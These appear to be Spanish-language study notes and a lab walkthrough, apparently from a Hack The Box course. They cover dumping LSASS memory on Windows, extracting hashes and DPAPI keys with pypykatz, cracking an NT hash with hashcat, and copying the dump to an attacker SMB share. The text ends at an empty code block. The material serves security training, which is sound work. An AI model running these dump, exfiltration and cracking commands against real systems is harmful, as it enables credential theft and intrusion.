A parte de atacar contra la base de datos SAM para extrar y descifrar contraseñas, también nos podemos beneficiar de atacar a LSASS (Servicio de Subsistema de aAutoridad de Seguridad Local).

Al iniciar sesión por primera vez, LSASS hará lo siguiente:

- Almacenar credenciales localmente en la memoria
- Crear tokens de acceso
- Hacer cumplir las políticas de seguridad
- Escribir en el registro de seguridad de Windows

---
Algunas estrategias que podemos realizar para volcar la memoria LSASS y extraer credenciales son:

### Volcado de memoria del proceso LSASS
De forma similar al proceso de atacar la base de datos SAM, sería prudente crear primero una copia del contenido de la memoria del proceso LSASS mediante la generación de un volcado de memoria. Crear un archivo de volcado nos permite extraer credenciales sin conexión usando nuestro host de ataque. Tenga en cuenta que realizar ataques sin conexión nos da mayor flexibilidad en la velocidad del ataque y requiere menos tiempo en el sistema objetivo. Existen innumerables métodos para crear un volcado de memoria, así que veamos las técnicas que se pueden realizar con las herramientas integradas en Windows.

### 1. Método del Administrador de tareas
Con acceso a una sesión gráfica interactiva en el objetivo, podemos usar el Administrador de tareas para crear un volcado de memoria. Para ello, debemos:
- Abrir el Administrador de tareas
- Seleccionar la pestaña Procesos
- Buscar y hacer clic con el botón derecho en el proceso de la Autoridad de Seguridad Local
- Seleccionar: *Crear archivo de volcado*
Se crea un archivo llamado `lsass.DMP`y se guarda en `%temp%`. Este es el archivo que transferiremos a nuestro host de ataque. Podemos usar el método de transferencia de archivos descrito en la sección anterior de este módulo para transferir el archivo de volcado a nuestro host de ataque.


### 2. Método Rundll32.exe y Comsvcs.dll

l método del Administrador de Tareas requiere una sesión interactiva basada en GUI con un objetivo. Podemos usar un método alternativo para volcar la memoria del proceso LSASS mediante una utilidad de línea de comandos llamada rundll32.exe . Este método es más rápido que el del Administrador de Tareas y más flexible, ya que podemos obtener una sesión de shell en un host Windows con acceso únicamente a la línea de comandos. Es importante tener en cuenta que las herramientas antivirus modernas reconocen este método como actividad maliciosa.

Antes de ejecutar el comando para crear el archivo de volcado, debemos determinar qué ID de proceso ( PID) está asignado a lsass.exe. Esto se puede hacer desde cmd o PowerShell:
##### A- Encontrar el PID de LSASS en cmd
Desde cmd, podemos emitir el comando `tasklist /svc`para buscar `lsass.exe`y su ID de proceso.:

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```


##### b- Encontrar el PID de LSASS en PowerShell
Desde PowerShell, podemos emitir el comando `Get-Process lsass`y ver el ID del proceso en el `Id`campo:
```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```



Una vez que tenemos el PID asignado al proceso LSASS, podemos crear un archivo de volcado.

###  Creación de un archivo de volcado mediante PowerShell
Con una sesión de PowerShell elevada, podemos emitir el siguiente comando para crear un archivo de volcado:
```
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Con este comando, ejecutamos `rundll32.exe`una función exportada que `comsvcs.dll`también llama a la función MiniDumpWriteDump( `MiniDump`) para volcar la memoria del proceso LSASS a un directorio específico `C:\lsass.dmp`. Recuerde que la mayoría de las herramientas antivirus modernas reconocen esto como actividad maliciosa e impiden la ejecución del comando. En estos casos, debemos considerar maneras de eludir o deshabilitar la herramienta antivirus en cuestión. Las técnicas de elusión de antivirus quedan fuera del alcance de este módulo.

Si logramos ejecutar este comando y generar el `lsass.dmp`archivo, podemos proceder a transferir el archivo a nuestro cuadro de ataque para intentar extraer cualquier credencial que pueda haberse almacenado en la memoria del proceso LSASS.

**Nota:** Podemos utilizar el método de transferencia de archivos analizado en la sección Atacar SAM para obtener el archivo lsass.dmp desde el objetivo a nuestro host de ataque.

---
## Usando Pypykatz para extraer credenciales
Una vez que tengamos el archivo de volcado en nuestro host de ataque, podemos usar una potente herramienta llamada [pypykatz](https://github.com/skelsec/pypykatz) para extraer las credenciales del `.dmp`archivo. Pypykatz es una implementación de Mimikatz escrita completamente en Python. Su desarrollo en Python nos permite ejecutarlo en hosts de ataque basados ​​en Linux. Actualmente, Mimikatz solo funciona en sistemas Windows, por lo que para usarlo, necesitaríamos usar un host de ataque de Windows o ejecutarlo directamente en el objetivo, lo cual no es ideal. Esto convierte a Pypykatz en una alternativa atractiva, ya que solo necesitamos una copia del archivo de volcado y podemos ejecutarlo sin conexión desde nuestro host de ataque basado en Linux.

Recuerde que LSASS almacena las credenciales de las sesiones de inicio de sesión activas en sistemas Windows. Al volcar la memoria del proceso LSASS en el archivo, básicamente tomamos una instantánea de lo que había en la memoria en ese momento. Si había sesiones de inicio de sesión activas, las credenciales utilizadas para establecerlas estarán presentes. Ejecutemos Pypykatz con el archivo de volcado para averiguarlo.

#### Corriendo Pypykatz

El comando inicia el uso de `pypykatz`para analizar los secretos ocultos en el volcado de memoria del proceso LSASS. Usamos `lsa`en el comando porque LSASS es un subsistema de `Local Security Authority`. A continuación, especificamos la fuente de datos como un `minidump`archivo, seguido de la ruta al archivo de volcado almacenado en nuestro host de ataque. Pypykatz analiza el archivo de volcado y genera los resultados:

```shell-session
Polika4RM@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

#### MSV

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) es un paquete de autenticación de Windows que LSA utiliza para validar los intentos de inicio de sesión con la base de datos SAM. Pypykatz extrajo los hashes de contraseña `SID`, `Username`, `Domain`e incluso `NT`& `SHA1`asociados con la sesión de inicio de sesión de la cuenta de usuario bob, almacenados en la memoria del proceso LSASS. Esto resultará útil en el siguiente paso de nuestro ataque, que se describe al final de esta sección.

#### DIGITAL
```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST`Es un protocolo de autenticación antiguo habilitado por defecto en `Windows XP`- `Windows 8`y `Windows Server 2003`- `Windows Server 2012`. LSASS almacena en caché las credenciales utilizadas por WDIGEST en texto sin cifrar. Esto significa que, si nos encontramos en un sistema Windows con WDIGEST habilitado, lo más probable es que veamos una contraseña en texto sin cifrar. Los sistemas operativos Windows modernos tienen WDIGEST deshabilitado por defecto. Además, es fundamental tener en cuenta que Microsoft lanzó una actualización de seguridad para los sistemas afectados por este problema con WDIGEST. Podemos consultar los detalles de dicha actualización [aquí](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/) .

#### Kerberos
```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) es un protocolo de autenticación de red utilizado por Active Directory en entornos de dominio de Windows. A las cuentas de usuario del dominio se les asignan tickets tras la autenticación con Active Directory. Este ticket permite al usuario acceder a los recursos compartidos de la red a los que tiene acceso sin necesidad de introducir sus credenciales cada vez. LSASS almacena en caché los valores `passwords`, `ekeys`, `tickets`y `pins`asociados con Kerberos. Es posible extraerlos de la memoria del proceso LSASS y utilizarlos para acceder a otros sistemas unidos al mismo dominio.

#### DPAPI
```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz y Pypykatz pueden extraer la DPAPI `masterkey`de los usuarios conectados cuyos datos se encuentran en la memoria del proceso LSASS. Estas claves maestras pueden utilizarse para descifrar los secretos asociados a cada aplicación que utiliza DPAPI, lo que permite la captura de credenciales de diversas cuentas. Las técnicas de ataque DPAPI se explican con más detalle en el módulo ["Escalada de privilegios de Windows"](https://academy.hackthebox.com/module/details/67) .

---

#### Descifrando el hash NT con Hashcat

Podemos usar Hashcat para descifrar el hash de NT. En este ejemplo, solo encontramos un hash de NT asociado al usuario Bob. Tras configurar el modo en el comando, podemos pegar el hash, especificar una lista de palabras y descifrarlo.

```shell-session
Polika4RM@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

---

**1. What is the name of the executable file associated with the Local Security Authority Process?**
Teoría: **lsass.exe**

**2. Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

Me conecto por RDP al servidor:
```
xfreerdp /v:10.129.202.149 /u:htb-student /p:'HTB_@cademy_stdnt!'
```

Voy a usar el Administrador de tareas para crear un volcado de memoria. Para ello, debemos:
- Abrir el Administrador de tareas
- Seleccionar la pestaña Procesos
- Buscar y hacer clic con el botón derecho en el proceso de la Autoridad de Seguridad Local
- Seleccionar: *Crear archivo de volcado*
Me devuelve el mensaje conforme el archivo se ha guardado en la ruta:
>C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP

No hay conexión a internet en la víctima para instalar el "pypykatz", pues necesito pasármelo a mi máquina Kali local. 

Desde linux (atacante), ejecuto:
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Me aseguro que la carpeta /tmp/smbshare se haya creado, de lo contrario, ejecuto:
```
sudo mkdir -p /tmp/smbshare
sudo chmod 777 /tmp/smbshare
ls -ld /tmp/smbshare
```

Desde la víctima, ejecutaré en un cmd como administrador:
```
net use N: \\10.10.14.107\share /user:test test
copy C:\Users\htb-student\AppData\Local\Temp\lsass.dmp N:\
```

Después, desde la máquina atacante Linux, accediendo a:
```
cd /tmp/smbshare
```

Finalemente en Linux utilizo:
``
```

```